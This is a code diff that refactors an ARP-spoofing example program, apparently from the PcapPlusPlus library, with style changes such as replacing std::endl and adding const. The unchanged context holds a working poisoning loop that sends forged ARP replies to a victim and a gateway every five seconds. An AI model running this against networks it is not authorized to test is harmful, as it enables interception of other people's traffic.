@@ -15,7 +15,7 @@
 	do                                                                                                                 \
 	{                                                                                                                  \
 		printUsage();                                                                                                  \
-		std::cout << std::endl << "ERROR: " << reason << std::endl << std::endl;                                       \
+		std::cout << '\n' << "ERROR: " << reason << '\n' << '\n';                                                      \
 		exit(1);                                                                                                       \
 	} while (0)
 
@@ -33,19 +33,19 @@ static struct option L3FwdOptions[] = {
  */
 void printUsage()
 {
-	std::cout << std::endl
-	          << "Usage:" << std::endl
-	          << "------" << std::endl
-	          << pcpp::AppName::get() << " [-hv] -i interface_ip -c victim_ip -g gateway_ip" << std::endl
-	          << std::endl
-	          << "Options:" << std::endl
-	          << std::endl
-	          << "    -i interface_ip   : The IPv4 address of interface to use" << std::endl
-	          << "    -c victim_ip      : The IPv4 address of the victim" << std::endl
-	          << "    -g gateway_ip     : The IPv4 address of the gateway" << std::endl
-	          << "    -h                : Displays this help message and exits" << std::endl
-	          << "    -v                : Displays the current version and exists" << std::endl
-	          << std::endl;
+	std::cout << '\n'
+	          << "Usage:" << '\n'
+	          << "------" << '\n'
+	          << pcpp::AppName::get() << " [-hv] -i interface_ip -c victim_ip -g gateway_ip" << '\n'
+	          << '\n'
+	          << "Options:" << '\n'
+	          << '\n'
+	          << "    -i interface_ip   : The IPv4 address of interface to use" << '\n'
+	          << "    -c victim_ip      : The IPv4 address of the victim" << '\n'
+	          << "    -g gateway_ip     : The IPv4 address of the gateway" << '\n'
+	          << "    -h                : Displays this help message and exits" << '\n'
+	          << "    -v                : Displays the current version and exists" << '\n'
+	          << '\n';
 }
 
 /**
@@ -53,9 +53,9 @@ void printUsage()
  */
 void printAppVersion()
 {
-	std::cout << pcpp::AppName::get() << " " << pcpp::getPcapPlusPlusVersionFull() << std::endl
-	          << "Built: " << pcpp::getBuildDateTime() << std::endl
-	          << "Built from: " << pcpp::getGitInfo() << std::endl;
+	std::cout << pcpp::AppName::get() << " " << pcpp::getPcapPlusPlusVersionFull() << '\n'
+	          << "Built: " << pcpp::getBuildDateTime() << '\n'
+	          << "Built from: " << pcpp::getGitInfo() << '\n';
 	exit(0);
 }
 
@@ -64,8 +64,8 @@ pcpp::MacAddress getMacAddress(const pcpp::IPv4Address& ipAddr, pcpp::PcapLiveDe
 	// Create an ARP packet and change its fields
 	pcpp::Packet arpRequest(500);
 
-	pcpp::MacAddress macSrc = pDevice->getMacAddress();
-	pcpp::MacAddress macDst(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
+	const pcpp::MacAddress macSrc = pDevice->getMacAddress();
+	const pcpp::MacAddress macDst(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
 	pcpp::EthLayer ethLayer(macSrc, macDst, static_cast<uint16_t>(PCPP_ETHERTYPE_ARP));
 	pcpp::ArpLayer arpLayer(pcpp::ArpRequest(pDevice->getMacAddress(), pDevice->getIPv4Address(), ipAddr));
 
@@ -77,7 +77,7 @@ pcpp::MacAddress getMacAddress(const pcpp::IPv4Address& ipAddr, pcpp::PcapLiveDe
 	pcpp::ArpFilter arpFilter(pcpp::ARP_REPLY);
 	if (!pDevice->setFilter(arpFilter))
 	{
-		std::cerr << "Could not set ARP filter on device" << std::endl;
+		std::cerr << "Could not set ARP filter on device" << '\n';
 		return pcpp::MacAddress::Zero;
 	}
 
@@ -90,17 +90,17 @@ pcpp::MacAddress getMacAddress(const pcpp::IPv4Address& ipAddr, pcpp::PcapLiveDe
 
 	if (capturedPackets.size() < 1)
 	{
-		std::cerr << "No arp reply was captured. Couldn't retrieve MAC address for IP " << ipAddr << std::endl;
+		std::cerr << "No arp reply was captured. Couldn't retrieve MAC address for IP " << ipAddr << '\n';
 		return pcpp::MacAddress::Zero;
 	}
 
 	// parse arp reply and extract the MAC address
-	pcpp::Packet arpReply(capturedPackets.front());
+	const pcpp::Packet arpReply(capturedPackets.front());
 	if (arpReply.isPacketOfType(pcpp::ARP))
 	{
 		return arpReply.getLayerOfType<pcpp::ArpLayer>()->getSenderMacAddress();
 	}
-	std::cerr << "No arp reply was captured. Couldn't retrieve MAC address for IP " << ipAddr << std::endl;
+	std::cerr << "No arp reply was captured. Couldn't retrieve MAC address for IP " << ipAddr << '\n';
 	return pcpp::MacAddress::Zero;
 }
 
@@ -118,7 +118,7 @@ void doArpSpoofing(pcpp::PcapLiveDevice* pDevice, const pcpp::IPv4Address& gatew
 	{
 		EXIT_WITH_ERROR("Failed to find gateway MAC address: " << e.what());
 	}
-	std::cout << "Got gateway MAC address: " << gatewayMacAddr << std::endl;
+	std::cout << "Got gateway MAC address: " << gatewayMacAddr << '\n';
 
 	// Get the victim MAC address
 	pcpp::MacAddress victimMacAddr;
@@ -130,9 +130,9 @@ void doArpSpoofing(pcpp::PcapLiveDevice* pDevice, const pcpp::IPv4Address& gatew
 	{
 		EXIT_WITH_ERROR("Failed to find victim MAC address: " << e.what());
 	}
-	std::cout << "Got victim MAC address: " << victimMacAddr << std::endl;
+	std::cout << "Got victim MAC address: " << victimMacAddr << '\n';
 
-	pcpp::MacAddress deviceMacAddress = pDevice->getMacAddress();
+	const pcpp::MacAddress deviceMacAddress = pDevice->getMacAddress();
 
 	// Create ARP reply for the gateway
 	pcpp::Packet gwArpReply(500);
@@ -151,15 +151,15 @@ void doArpSpoofing(pcpp::PcapLiveDevice* pDevice, const pcpp::IPv4Address& gatew
 	victimArpReply.computeCalculateFields();
 
 	// Send ARP replies to gateway and to victim every 5 seconds
-	std::cout << "Sending ARP replies to victim and to gateway every 5 seconds..." << std::endl << std::endl;
-	while (1)
+	std::cout << "Sending ARP replies to victim and to gateway every 5 seconds..." << '\n' << '\n';
+	while (true)
 	{
 		pDevice->sendPacket(gwArpReply);
 		std::cout << "Sent ARP reply: " << gatewayAddr << " [gateway] is at MAC address " << deviceMacAddress << " [me]"
-		          << std::endl;
+		          << '\n';
 		pDevice->sendPacket(victimArpReply);
 		std::cout << "Sent ARP reply: " << victimAddr << " [victim] is at MAC address " << deviceMacAddress << " [me]"
-		          << std::endl;
+		          << '\n';
 		std::this_thread::sleep_for(std::chrono::seconds(5));
 	}
 }
@@ -170,7 +170,9 @@ int main(int argc, char* argv[])
 
 	// Get arguments from user for incoming interface and outgoing interface
 
-	std::string iface = "", victim = "", gateway = "";
+	std::string iface;
+	std::string victim;
+	std::string gateway;
 	int optionIndex = 0;
 	int opt = 0;
 	while ((opt = getopt_long(argc, argv, "i:c:g:hv", L3FwdOptions, &optionIndex)) != -1)
@@ -202,7 +204,7 @@ int main(int argc, char* argv[])
 	}
 
 	// Both incoming and outgoing interfaces must be provided by user
-	if (iface == "" || victim == "" || gateway == "")
+	if (iface.empty() || victim.empty() || gateway.empty())
 	{
 		EXIT_WITH_ERROR("Please specify both interface IP, victim IP and gateway IP");
 	}
